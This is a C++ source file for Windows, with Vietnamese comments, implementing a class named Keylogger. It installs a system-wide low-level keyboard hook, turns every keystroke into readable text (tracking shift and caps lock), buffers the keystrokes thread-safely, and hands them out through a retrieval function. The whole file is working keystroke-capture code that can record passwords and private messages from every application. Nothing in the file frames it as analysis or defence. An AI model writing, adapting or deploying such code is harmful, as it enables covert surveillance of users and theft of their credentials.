#include "KeyboardController.h"
#ifdef _WIN32

// Khởi tạo các biến static
HHOOK Keylogger::_hook = NULL;
vector<std::string> Keylogger::_buffer;
std::mutex Keylogger::_mtx;

Keylogger::Keylogger() : _isRunning(false) {}

Keylogger::~Keylogger() {
    Stop(); // Đảm bảo dừng thread khi hủy class
}

// --- PHẦN 1: Logic xử lý chuỗi ---
void Keylogger::append(const std::string& str) {
    // Thread-safe buffer access
    std::lock_guard<std::mutex> lock(_mtx);
    _buffer.push_back(str);
}

// --- PHẦN 2: Hàm xử lý phím (Hook Procedure) ---
LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Process valid keydown events only
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        int key = kbdStruct->vkCode; // Lấy mã phím ảo

        // Xử lý các phím đặc biệt để dễ đọc
        if (key == VK_RETURN) append("[RETURN]");
        else if (key == VK_BACK) append("[DELETE]");
        else if (key == VK_SPACE) append(" ");
        else if (key == VK_TAB) append("[TAB]");
        else if (key == VK_DELETE) append("[DEL]");
        else if (key == VK_ESCAPE) append("[ESC]");
        if (key == VK_LSHIFT) append("[L-SHIFT]");
        else if (key == VK_RSHIFT) append("[R-SHIFT]");

        else if (key == VK_LCONTROL) append("[L-CTRL]");
        else if (key == VK_RCONTROL) append("[R-CTRL]");

        else if (key == VK_LMENU) append("[L-ALT]");
        else if (key == VK_RMENU) append("[R-ALT]");

        else if (key == VK_LWIN) append("[L-CMD]");
        else if (key == VK_RWIN) append("[R-CMD]");
        else if (key == VK_CAPITAL) append("[CAPS]");
        else if (key == VK_NUMLOCK) append("[NUMLOCK]");
        else if (key == VK_SCROLL) append("[SCROLL]");
        else if (key == VK_LEFT) append("[LEFT]");
        else if (key == VK_RIGHT) append("[RIGHT]");
        else if (key == VK_UP) append("[UP]");
        else if (key == VK_DOWN) append("[DOWN]");
        else if (key == VK_HOME) append("[HOME]");
        else if (key == VK_END) append("[END]");
        else if (key == VK_PRIOR) append("[PGUP]");
        else if (key == VK_NEXT) append("[PGDN]");
        else if (key == VK_INSERT) append("[INS]");
        else if (key == VK_F1) append("[F1]");
        else if (key == VK_F2) append("[F2]");
        else if (key == VK_F3) append("[F3]");
        else if (key == VK_F4) append("[F4]");
        else if (key == VK_F5) append("[F5]");
        else if (key == VK_F6) append("[F6]");
        else if (key == VK_F7) append("[F7]");
        else if (key == VK_F8) append("[F8]");
        else if (key == VK_F9) append("[F9]");
        else if (key == VK_F10) append("[F10]");
        else if (key == VK_F11) append("[F11]");
        else if (key == VK_F12) append("[F12]");
        else if (key == VK_F13) append("[F13]");
        else if (key == VK_F14) append("[F14]");
        else if (key == VK_F15) append("[F15]");
        else if (key == VK_OEM_1) {
            BYTE keyState[256];
            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
                append(":");
            } else {
                append(";");
            }
        }
        else if (key == VK_OEM_PLUS) {
            BYTE keyState[256];
            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
                append("+");
            } else {
                append("=");
            }
        }
        else if (key == VK_OEM_COMMA) {
            BYTE keyState[256];
            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
                append("<");
            } else {
                append(",");
            }
        }
        else if (key == VK_OEM_MINUS) {
            BYTE keyState[256];
            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
                append("_");
            } else {
                append("-");
            }
        }
        else if (key == VK_OEM_PERIOD) {
            BYTE keyState[256];
            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
                append(">");
            } else {
                append(".");
            }
        }
        else if (key == VK_OEM_2) {
            BYTE keyState[256];
            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
                append("?");
            } else {
                append("/");
            }
        }
        else if (key == VK_OEM_3) {
            BYTE keyState[256];
            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
                append("~");
            } else {
                append("`");
            }
        }
        else if (key == VK_OEM_4) {
            BYTE keyState[256];
            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
                append("{");
            } else {
                append("[");
            }
        }
        else if (key == VK_OEM_5) {
            BYTE keyState[256];
            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
                append("|");
            } else {
                append("\\");
            }
        }
        else if (key == VK_OEM_6) {
            BYTE keyState[256];
            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
                append("}");
            } else {
                append("]");
            }
        }
        else if (key == VK_OEM_7) {
            BYTE keyState[256];
            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
                append("\"");
            } else {
                append("'");
            }
        }
        // Xử lý số và chữ cái với Shift
        else if ((key >= '0' && key <= '9') || (key >= 'A' && key <= 'Z')) {
             BYTE keyState[256];
             if (GetKeyboardState(keyState)) {
                 bool isShift = (keyState[VK_SHIFT] & 0x80) != 0;
                 bool isCapsLock = (keyState[VK_CAPITAL] & 0x01) != 0;
                 
                 if (key >= 'A' && key <= 'Z') {
                     char c = (char)key;
                     if ((isShift && !isCapsLock) || (!isShift && isCapsLock)) {
                         append(std::string(1, c));
                     } else {
                         append(std::string(1, c + 32));
                     }
                 } else if (key >= '0' && key <= '9') {
                     char numChars[] = "0123456789";
                     char specialChars[] = ")!@#$%^&*(";
                     int index = key - '0';
                     if (isShift && index < 10) {
                         append(std::string(1, specialChars[index]));
                     } else {
                         append(std::string(1, numChars[index]));
                     }
                 }
             } else {
                 append(std::string(1, (char)key));
             }
        }
        else {
             // Các phím lạ thì ghi mã số
             append("[" + std::to_string(key) + "]");
        }
    }
    // Forward event to next hook (required for keyboard to work)
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

// --- PHẦN 3: Quản lý luồng (Threading) ---
void Keylogger::Start() {
    if (_isRunning) return;
    _isRunning = true;

    // Tạo luồng riêng để lắng nghe
    _workerThread = std::thread([this]() {
        // Cài đặt Hook
        _hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

        // Vòng lặp tin nhắn (Message Loop)
        // Bắt buộc phải có để Hook hoạt động trên Windows
        MSG msg;
        while (_isRunning && GetMessage(&msg, NULL, 0, 0)) {
            if (msg.message == WM_QUIT) break; // Nhận lệnh thoát thì dừng
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        // Dọn dẹp hook khi vòng lặp kết thúc
        if (_hook) {
            UnhookWindowsHookEx(_hook);
            _hook = NULL;
        }
    });
}

void Keylogger::Stop() {
    if (!_isRunning) return;
    _isRunning = false;

    // Gửi tin nhắn WM_QUIT vào luồng worker để đánh thức GetMessage và thoát vòng lặp
    if (_workerThread.joinable()) {
        PostThreadMessage(GetThreadId(_workerThread.native_handle()), WM_QUIT, 0, 0);
        _workerThread.join();
    }
}

// --- PHẦN 4: Lấy dữ liệu an toàn ---
vector<std::string> Keylogger::getDataAndClear() {
    std::lock_guard<std::mutex> lock(_mtx); // Khóa lại!
    
    if (_buffer.empty()) return {};
    
    vector<std::string> dataCopy = _buffer; // Copy dữ liệu ra
    _buffer.clear();                // Xóa dữ liệu gốc đi
    
    return dataCopy; // Trả về bản copy
} // Tự động mở khóa
#endif